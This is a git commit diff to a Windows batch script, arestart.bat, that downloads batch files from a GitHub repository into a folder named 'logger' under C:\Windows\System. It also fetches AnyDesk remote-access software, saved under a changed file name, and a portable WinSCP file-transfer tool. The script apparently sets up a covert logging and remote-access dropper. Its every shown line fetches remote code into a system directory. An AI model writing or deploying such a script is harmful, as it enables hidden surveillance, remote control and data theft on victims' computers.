1e6e4e7d05d363ef6d134bf25dbcc427fbebe215
TheBetaBiggie <53587460+TheBetaBiggie@users.noreply.github.com>
2022-08-24 17:28:04 -0700

    Update arestart.bat

--- arestart.bat
+++ arestart.bat
@@ -7,7 +7,7 @@ powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/ss1.bat -OutFile C:\Windows\System\logger\ss1.bat
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/gen.bat -OutFile C:\Windows\System\logger\gen.bat
 mkdir C:\Windows\System\logger\Anydesk
-powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\System\logger\Anydesk\AnyDesk.exe
+powershell Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile C:\Windows\System\logger\Anydesk\installer.exe
 :scp
 powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/WinSCP-5.21.2-Portable.zip -OutFile C:\Windows\System\logger\scp.zip
 powershell Expand-Archive C:\Windows\System\logger\scp.zip -DestinationPath C:\Windows\System\logger\
